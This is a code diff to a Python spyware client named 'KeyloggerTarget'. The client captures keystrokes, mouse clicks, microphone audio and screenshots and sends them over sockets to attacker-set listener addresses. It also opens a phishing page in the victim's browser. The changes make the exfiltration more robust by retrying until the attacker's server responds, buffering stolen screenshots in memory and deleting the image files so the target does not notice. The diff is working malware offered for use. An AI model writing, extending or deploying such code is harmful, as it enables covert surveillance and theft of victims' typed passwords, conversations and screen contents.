@@ -8,10 +8,8 @@ import pyautogui as pg
 import os
 import pyaudio
 import threading
-import random
 import requests
 import webbrowser
-import shutil
 from datetime import datetime
 
 
@@ -41,10 +39,21 @@ class KeyloggerTarget:
         self.word = None
         self.seconds = []
         self.frames = None
+        self.amount = 0
+        self.images_data = {}
+        self.true_connection = False
+
 
     def daten_aufnehemen(self):
-        listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listening_data.connect((self.ip_listener, self.port_listener))
+        while True:
+            try:
+                listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                listening_data.connect((self.ip_listener, self.port_listener))
+                self.true_connection = True
+                break
+            except:
+                continue
+
         try:
             format = pyaudio.paInt16
             channels = 2
@@ -75,52 +84,63 @@ class KeyloggerTarget:
             # Connection with ServerListener
 
             self.frames = str(frames)
-            listening_data.send(self.frames.encode())
+            # If the server is the down it will store the data locally and wait until the server is available again.
+            while True:
+                try:
+                    listening_data.send(self.frames.encode())
+                    break
+                except:
+                    continue
+
 
         except OSError:
             print("NO MICROPHONE DETECTED OR MICROPHONE SETTING DISABLED")
             no_microfon = "THE TARGET HAS NO MICROPHONE ON"
-            listening_data.send(no_microfon.encode())
+
+            # If the server is the down it will store the data locally and wait until the server is available again.
+            while True:
+                try:
+                    listening_data.send(no_microfon.encode())
+                    break
+                except:
+                    continue
             # Sends data to ServerListener
 
-    def all_dir(self):
-        global random_lst
-        zeichen = "qwertzuiopasdfghjklyxcvbnm1234567890"
-        random_lst = ["".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]
-        # This makes a list of every directory name randomly
-        for dir_name in random_lst:
-            os.system(f"mkdir {dir_name}")
-            # The directory is being made here
-        lst_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        lst_server.connect(("127.0.0.1", 1077))
-        lst_server.send(str(random_lst).encode())
-        lst_server.close()
-
-        random_dir = random.choice(random_lst)
-        os.chdir(random_dir)
-        # We are now in that directory where the image can be stored
-
-    def client(self, ip_photos, port_photos):
-        global fhandle
-        # fhandle is the variable which opens the foto
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip_photos, port_photos))
+    def client(self):
+        self.amount += 1
         # This connects to the server you specified
         image = pg.screenshot()
         # "image" screenshots the current image after a specific time
-        fotoname = "Image.png"
+        fotoname = f"IMAGE ({self.amount}).png"
         # Name of the image
         image.save(fotoname)
         # Saves the image in the current directory
-        fhandle = open(fotoname, "rb")
-        # Opens the image
+        for every_image in os.listdir():
+            if "IMAGE" in every_image:
+                with open(every_image, "rb") as file:
+                    data = b""
+                    for line in file:
+                        data += line
+                    # Gets all the data and stores it in "self.images_data"
+                self.images_data[every_image] = data
+        # No matter if the targets deletes the image it will be stored locally
 
-        full_msg = b""
-        # Every image information will be stored in "full_msg"
-        for line in fhandle:
-            full_msg += line
+        os.remove(fotoname)
+        # This deletes the photo
 
-        s.send(full_msg)
+    def send_image(self, ip_photos, port_photos):
+        # If the server is the down it will store the data locally and wait until the server is available again.
+        while True:
+            try:
+                send_images = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                send_images.connect((ip_photos, port_photos))
+
+                send_images.send(str(self.images_data).encode())
+                break
+            except:
+                continue
+
+        sys.exit()
 
     def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
         seconds_list = [zahl for zahl in range(0, zeit + 1, 20) if zahl != 0]
@@ -130,16 +150,19 @@ class KeyloggerTarget:
 
         try:
             for x in range(zeit + 1):
-                if x == 20:
-                    self.all_dir()
-                    # This function makes 100 files to store the image so the target won't find out
                 print(x)
                 zeit -= 1
                 time.sleep(1)
                 if x in seconds_list:
-                    self.client(ip_photos, port_photos)
+                    self.client()
                     # The images will be sent
-            key_data.connect((ip_keylogger, port_keylogger))
+            while True:
+                try:
+                    key_data.connect((ip_keylogger, port_keylogger))
+                    break
+                except:
+                    continue
+
             # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
             # in the same folder
             print(self.coordinates)
@@ -154,18 +177,16 @@ class KeyloggerTarget:
             key_data.send(all_data.encode())
             print(wort)
             print(self.richtige_liste)
-            fhandle.close()
             # Closes the image
-            os.remove("Image.png")
-            # Deletes the image in the current directory
-            os.chdir("..")
+
+            self.send_image(ip_photos, port_photos)
+
             # We have to go back so that we can delete the other directories
-            for each_dir in random_lst:
-                shutil.rmtree(each_dir)
-                # This deletes every directory
             sys.exit()
             # Stops the keylogger
         except KeyboardInterrupt:
+            self.send_image(ip_photos, port_photos)
+
             # If the target has destroyed the connection
             wort = "***%§§)§§%"
             # This is like a special code. To split it at the end
@@ -175,18 +196,19 @@ class KeyloggerTarget:
                 wort += str(self.coordinates)
             data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
             # This let's the server know that the server should shut down
-            key_data.connect((ip_keylogger, port_keylogger))
-            key_data.send(data.encode())
-            key_data.close()
+            while True:
+                try:
+                    key_data.connect((ip_keylogger, port_keylogger))
+                    key_data.send(data.encode())
+                    key_data.close()
+                    break
+                except:
+                    continue
 
-            if os.path.exists("Image.png"):
-                # It will destroy the image so target wound know anything
-                fhandle.close()
-
-            new_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            new_server.connect(("127.0.0.1", 1077))
-            new_server.send("done".encode())
-            new_server.close()
+            if not os.listdir():
+                data = [image for image in os.listdir() if "IMAGE" in image]
+                for each in data:
+                    os.remove(each)
 
     def kill_switch(self):
         # This function destroys the mouse info
@@ -260,7 +282,13 @@ class KeyloggerTarget:
 
         except AttributeError:
             print(f'An other key was pressed: {key}')
-            if key == keyboard.Key.space or key == keyboard.Key.tab:
+            if key == keyboard.Key.tab:
+                self.richtige_liste += " [TAB] "
+
+            elif key == keyboard.Key.enter:
+                self.richtige_liste += " [ENTER] "
+
+            elif key == keyboard.Key.space:
                 self.richtige_liste += "{"
                 # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
                 # space or a tab key has been pressed
@@ -320,41 +348,47 @@ class KeyloggerTarget:
         time.sleep(1)
         # Just to cool down
 
-        if self.phishing is not None:
-            try:
-                requests.get(self.phishing)
-                # Respone is here to see if the website is online or not
-                webbrowser.open(self.phishing)
-
-            except requests.exceptions.ConnectionError:
-                print("No connection")
-
-            except requests.exceptions.InvalidURL:
-                print("Invalid Url")
-
         listening_thread = threading.Thread(target=self.daten_aufnehemen)
         # This runs the program behind the actual programming
         listening_thread.start()
 
+        if self.phishing is not None:
+            while True:
+                if self.true_connection:
+                    try:
+                        requests.get(self.phishing)
+                        # Response is here to see if the website is online or not
+                        webbrowser.open(self.phishing)
+                        break
+
+                    except requests.exceptions.ConnectionError:
+                        break
+
+                    except requests.exceptions.InvalidURL:
+                        break
+
+
+
         threading_mouse = threading.Thread(target=self.all_clicks)
         # This runs the progrmm behind the actual programming
         threading_mouse.start()
+        # If the server is the down it will store the data locally and wait until the server is available again.
+        while True:
+            try:
+                send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                send_timer.connect((self.ip_timer, self.port_timer))
 
-        send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        send_timer.connect((self.ip_timer, self.port_timer))
+                send_timer.send(str(self.duration).encode())
+                # This sends the seconds to the server
+                send_timer.close()
+                break
 
-        send_timer.send(str(self.duration).encode())
-        # This sends the seconds to the server
-        send_timer.close()
+            except:
+                continue
 
-        timer_delete_dir = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        timer_delete_dir.connect(("127.0.0.1", 1077))
-
-        timer_delete_dir.send(str(self.duration).encode())
-        timer_delete_dir.close()
 
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
                                 self.port_keylogger)
             listener.join()
-            # This listens to the keys that where typed
+            # This listens to the keys that where ty
